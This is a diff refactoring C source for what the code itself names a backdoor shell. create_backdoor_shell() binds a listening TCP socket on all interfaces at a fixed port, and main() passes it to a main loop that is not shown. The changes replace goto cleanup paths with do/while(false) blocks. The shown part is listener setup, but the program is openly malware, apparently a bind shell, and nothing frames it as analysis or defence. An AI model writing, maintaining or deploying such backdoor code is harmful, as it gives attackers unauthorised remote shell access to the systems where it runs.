@@ -28,31 +28,32 @@ static inline int reuse_addr(Socket sock) {
 static inline Socket create_backdoor_shell() {
   Socket sock = INVALID_SOCKET;
 
-  sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-  if (!xsocket_valid(sock)) {
-    return INVALID_SOCKET;
-  }
+  do {
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (!xsocket_valid(sock)) {
+      return INVALID_SOCKET;
+    }
 
-  if (reuse_addr(sock) == SOCKET_ERROR) {
-    goto error;
-  }
+    if (reuse_addr(sock) == SOCKET_ERROR) {
+      break;
+    }
 
-  struct sockaddr_in address = {};
-  address.sin_family = AF_INET;
-  address.sin_port = htons(XSOCKET_PORT);
-  address.sin_addr.s_addr = htonl(INADDR_ANY);
+    struct sockaddr_in address = {};
+    address.sin_family = AF_INET;
+    address.sin_port = htons(XSOCKET_PORT);
+    address.sin_addr.s_addr = htonl(INADDR_ANY);
 
-  if (bind(sock, (struct sockaddr *)&address, sizeof address) < 0) {
-    goto error;
-  }
+    if (bind(sock, (struct sockaddr *)&address, sizeof address) < 0) {
+      break;
+    }
 
-  if (listen(sock, 1) < 0) {
-    goto error;
-  }
+    if (listen(sock, 1) < 0) {
+      break;
+    }
 
-  return sock;
+    return sock;
+  } while (false);
 
-error:
   if (xsocket_valid(sock)) {
     close_socket(sock);
   }
@@ -66,26 +67,31 @@ error:
 int main(void) {
   int rc = 0;
   Socket shell = INVALID_SOCKET;
+  bool xsocket_ok = false;
 
-  if (!xsocket_init()) {
-    rc = 1;
-    goto cleanup;
-  }
+  do {
+    if (!xsocket_init()) {
+      rc = 1;
+      break;
+    }
+    xsocket_ok = true;
 
-  shell = create_backdoor_shell();
-  if (!xsocket_valid(shell)) {
-    rc = 1;
-    goto cleanup;
-  }
+    shell = create_backdoor_shell();
+    if (!xsocket_valid(shell)) {
+      rc = 1;
+      break;
+    }
 
-  rc = main_loop(shell);
+    rc = main_loop(shell);
+  } while (false);
 
-cleanup:
   if (xsocket_valid(shell)) {
     close_socket(shell);
   }
 
-  xsocket_cleanup();
+  if (xsocket_ok) {
+    xsocket_cleanup();
+  }
 
   return rc;
 }
